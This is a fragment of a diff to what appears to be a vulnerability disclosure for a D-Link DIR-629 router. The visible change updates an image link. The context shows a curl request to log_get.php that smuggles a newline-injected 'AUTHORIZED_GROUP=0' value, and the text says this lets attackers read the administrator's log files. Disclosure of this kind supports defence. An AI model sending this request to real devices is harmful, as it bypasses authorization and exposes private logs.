@@ -11,7 +11,7 @@ curl http://[ip]:[port]/log_get.php -d "aaa=%0aAUTHORIZED_GROUP=0"
 
 Attackers can get the log files of Admin
 
-![image-20191101091458421](.\image-20191101091458421.png) 
+![image-20191101091458421](https://github.com/Cyc1eC/D-Link/blob/master/DIR-629/image-20191101091458421.png) 
 
 if attackers send the data:
 
